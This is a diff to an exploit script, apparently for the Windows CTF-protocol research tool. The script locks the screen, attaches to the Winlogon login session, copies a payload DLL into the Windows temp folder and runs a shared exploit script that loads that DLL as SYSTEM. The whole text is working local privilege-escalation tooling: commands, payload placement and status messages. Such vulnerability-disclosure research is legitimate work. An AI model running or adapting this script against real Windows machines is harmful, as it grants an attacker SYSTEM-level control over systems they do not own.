@@ -2,10 +2,17 @@
 # switching to the Winlogon Desktop, and then exploiting the login screen
 # via the CTF session.
 
-print
-print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-print !!! THIS EXPLOIT REQUIRES C:\WINDOWS\TEMP\EXPLOIT.DLL TO EXIST !!!
-print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+print Attempting to copy exploit payload...
+
+# This exploit runs LoadLibraryA(C:\WINDOWS\TEMP\EXPLOIT.DLL) as SYSTEM.
+run CMD /C COPY PAYLOAD64.DLL %SYSTEMROOT%\TEMP\EXPLOIT.DLL
+
+# Print a warning if that didnt work.
+repeat rc print
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print !!! THIS EXPLOIT REQUIRES C:\WINDOWS\TEMP\EXPLOIT.DLL TO EXIST !!!
+repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+repeat rc print
 print
 print The screen will lock to trigger the login screen in 5 seconds...
 
@@ -26,3 +33,8 @@ wait LogonUI.exe
 
 # Now that we're connected and have a target selected, load the exploit script.
 script scripts\ctf-exploit-common-1903.ctf
+
+print
+print Exploit complete.
+print
+
